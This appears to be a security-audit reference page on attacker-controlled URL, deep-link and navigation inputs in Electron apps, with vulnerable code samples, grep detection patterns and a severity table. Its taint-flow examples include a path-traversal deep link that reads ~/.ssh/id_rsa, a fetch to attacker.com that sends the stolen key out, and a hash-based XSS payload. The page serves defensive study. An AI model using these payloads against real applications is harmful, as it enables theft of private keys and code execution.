---
title: URL & Navigation Sources
description: Attacker-controlled input via URLs, navigation events, and custom protocol handlers
---

# URL & Navigation Sources

URL-based sources are the **entry point** for most Electron XSS and injection vulnerabilities. Unlike web apps, Electron apps often load `file://` URLs, register custom protocol handlers, and receive URLs via deep links — all of which expand the attack surface.

---

## URL Parsing Sources

### window.location

```javascript
// Renderer-side: URL parameters are attacker-controlled:
const params = new URLSearchParams(window.location.search);
const redirectUrl = params.get('redirect');   // SOURCE
const userId = params.get('id');              // SOURCE
const view = params.get('view');              // SOURCE — used to select templates

// Full URL:
const currentUrl = window.location.href;      // SOURCE (if attacker-navigable)
const hash = window.location.hash;            // SOURCE — no server round-trip
const path = window.location.pathname;        // SOURCE (if app uses client routing)
```

**Key insight:** `location.hash` is particularly dangerous because it never hits a server — it's read directly by JavaScript with no server-side filtering.

---

## Custom Protocol Handlers

Electron apps can register custom URL schemes (`myapp://`, `app://`). These are invoked by:
- OS deep links
- Browser `<a href="myapp://...">` clicks
- Other apps calling `RegisteredProtocol.OpenWith`

```javascript
// Registration (main.js):
app.setAsDefaultProtocolClient('myapp');

// Handler:
app.on('open-url', (event, url) => {
  event.preventDefault();
  handleDeepLink(url);  // url is fully attacker-controlled
});

// Or via protocol.handle():
protocol.handle('app', (request) => {
  const url = new URL(request.url);
  const filePath = url.pathname;     // SOURCE: attacker controls pathname
  const query = url.searchParams;    // SOURCE: attacker controls params
  return net.fetch('file://' + filePath);
});
```

### Why Custom Protocols Are High Risk

1. **No authentication required** — any app (or web page via `<iframe>`) can invoke registered protocols
2. **Cross-origin invocable** — a website can trigger `myapp://evil-path`
3. **Full URL control** — attacker controls scheme, host, path, query, fragment
4. **Windows argument injection** — pre-Electron 1.8.2, protocols launched `app.exe "url"`, injection via `" --switches`

```javascript
// Vulnerable protocol handler:
app.on('open-url', (event, url) => {
  const parsed = new URL(url);
  const page = parsed.hostname;         // SOURCE
  const token = parsed.searchParams.get('token');  // SOURCE
  
  mainWindow.loadURL(`file://${__dirname}/${page}.html`);  // SINK: path traversal
  autoLogin(token);                                         // SINK: if token trusted
});
```

---

## Navigation Events

Electron exposes navigation lifecycle events, each of which carries attacker-influenced data:

```javascript
// will-navigate — fired before navigation, url is destination:
win.webContents.on('will-navigate', (event, url) => {
  // url could be attacker-controlled if app navigates based on content
  processNavigation(url);  // SOURCE: url is the navigation target
});

// did-navigate — after navigation completes:
win.webContents.on('did-navigate', (event, url) => {
  analytics.trackPageView(url);  // SOURCE: url reflects final destination
  updateTitleBar(url);           // SOURCE: url rendered in UI
});

// did-navigate-in-page — single-page app hash navigation:
win.webContents.on('did-navigate-in-page', (event, url, isMainFrame) => {
  router.handleRoute(url);  // SOURCE: hash portion attacker-controlled
});
```

---

## window.open and Popup URLs

```javascript
// Renderer creates popup:
window.open(userInput);           // SOURCE: attacker controls url
window.open(url, '_blank');       // SOURCE: if url derived from user data

// Electron intercepts via setWindowOpenHandler:
win.webContents.setWindowOpenHandler(({ url, frameName, features }) => {
  // url — SOURCE: fully attacker-controlled
  // frameName — SOURCE: window name from window.open
  openInNewWindow(url);  // if not validated
  return { action: 'deny' };
});
```

---

## Referrer and Navigation Context

```javascript
// Referrer header (in webRequest):
session.defaultSession.webRequest.onBeforeRequest((details, callback) => {
  const referrer = details.referrer;   // SOURCE: controlled by page making request
  logNavigation(referrer);             // SOURCE: if logged/processed
});
```

---

## Taint Flow Examples

### Deep Link → Path Traversal

```
myapp://open?file=../../.ssh/id_rsa
         │
         ▼ app.on('open-url')
         url.searchParams.get('file') → "../../.ssh/id_rsa"
         │
         ▼ no path validation
         fs.readFileSync(path.join(appDir, file))
         │
         ▼ reads ~/.ssh/id_rsa
         ipcMain sends content back to renderer
         │
         ▼ XSS payload exfiltrates: fetch('https://attacker.com/?k=' + content)
```

### Hash Navigation → XSS

```
file:///app/index.html#<img src=x onerror=eval(atob(...))>
         │
         ▼ client router reads location.hash
         const route = decodeURIComponent(window.location.hash.slice(1))
         │
         ▼ reflected into DOM without sanitization
         container.innerHTML = `<div class="${route}">`
         │
         ▼ XSS executes in renderer
```

---

## Detection Patterns

```bash
# Find protocol handler registrations:
grep -rn "setAsDefaultProtocolClient\|protocol\.handle\|protocol\.registerFile" \
  --include="*.js" . | grep -v node_modules

# Find open-url handler (deep link entry point):
grep -rn "open-url\|openUrl\|deep.link\|deepLink" \
  --include="*.js" . | grep -v node_modules

# Find URL parameter usage:
grep -rn "location\.search\|location\.hash\|URLSearchParams\|searchParams\.get" \
  --include="*.js" . | grep -v node_modules

# Find navigation event handlers:
grep -rn "will-navigate\|did-navigate\|navigate-in-page" \
  --include="*.js" . | grep -v node_modules
```

---

## Severity Notes

| Source | Risk | Notes |
|--------|------|-------|
| Custom protocol handler (`myapp://`) | Critical | Cross-origin invocable, OS-wide |
| `location.hash` | High | No server round-trip, no encoding |
| `location.search` params | High | Standard XSS vector |
| `will-navigate` URL | High | Full attacker-crafted URL |
| `window.open` target URL | Medium | Renderer-side only |
| `did-navigate` URL | Medium | After navigation, may be sanitized |
